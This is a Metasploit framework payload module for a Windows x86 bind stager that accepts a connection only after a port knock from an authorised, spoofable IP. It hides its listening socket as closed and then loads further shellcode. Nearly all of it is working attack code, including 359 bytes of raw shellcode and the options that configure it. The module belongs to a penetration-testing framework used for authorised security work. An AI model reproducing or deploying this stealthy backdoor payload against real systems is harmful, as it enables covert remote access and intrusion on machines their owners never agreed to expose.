##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'


module MetasploitModule

  CachedSize = 359

  include Msf::Payload::Stager
  include Msf::Payload::Windows


  def self.handler_type_alias
    "bind_hidden_ipknock_tcp"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Hidden Bind Ipknock TCP Stager',
      'Description'   => 'Listen for a connection. First, the port will need to be knocked from
                          the IP defined in KHOST. This IP will work as an authentication method
                          (you can spoof it with tools like hping). After that you could get your
                          shellcode from any IP. The socket will appear as "closed," thus helping to
                          hide the shellcode',
      'Author'        =>
        [
          'hdm',        # original payload module (stager bind_tcp)
          'skape',      # original payload module (stager bind_tcp)
          'sf',         # original payload module (stager bind_tcp)
          'Borja Merino <bmerinofe[at]gmail.com>' # Add Hidden Ipknock functionality
        ],
      'License'       => MSF_LICENSE,
      'References'    => ['URL', 'http://www.shelliscoming.com/2014/07/ip-knock-shellcode-spoofed-ip-as.html'],
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindTcp,
      'Convention'    => 'sockedi',
      'Stager'        =>
        {
          'RequiresMidstager' => false,
          'Offsets' =>
            {
              'LPORT'    => [ 193, 'n' ],
              'KHOST'    => [ 255, 'ADDR' ]
            },
          'Payload' =>
            # Length: 359 bytes
            "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b" +
            "\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c" +
            "\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52" +
            "\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20" +
            "\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac" +
            "\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75" +
            "\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3" +
            "\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff" +
            "\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77" +
            "\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00" +
            "\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40" +
            "\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x31\xdb\x53\x68\x02" +
            "\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5" +
            "\x6a\x01\x54\x68\x02\x30\x00\x00\x68\xff\xff\x00\x00\x57\x68\xf1" +
            "\xa2\x77\x29\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5\x53\xe8" +
            "\x1a\x00\x00\x00\x8b\x44\x24\x04\x8b\x40\x04\x8b\x40\x04\x2d\xc0" +
            "\xa8\x01\x21\x74\x03\x31\xc0\x40\x89\x45\x54\xc2\x20\x00\x53\x53" +
            "\x57\x68\x94\xac\xbe\x33\xff\xd5\x83\x7c\x24\x04\x00\x75\xcf\x40" +
            "\x75\x06\x53\x53\xeb\xe8\x74\xc6\x48\x57\x97\x68\x75\x6e\x4d\x61" +
            "\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b" +
            "\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5" +
            "\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5" +
            "\x01\xc3\x29\xc6\x75\xee\xc3"
        }
      ))

    register_options([
      OptAddress.new('KHOST', [true, "IP address allowed", nil])
    ])
  end
end
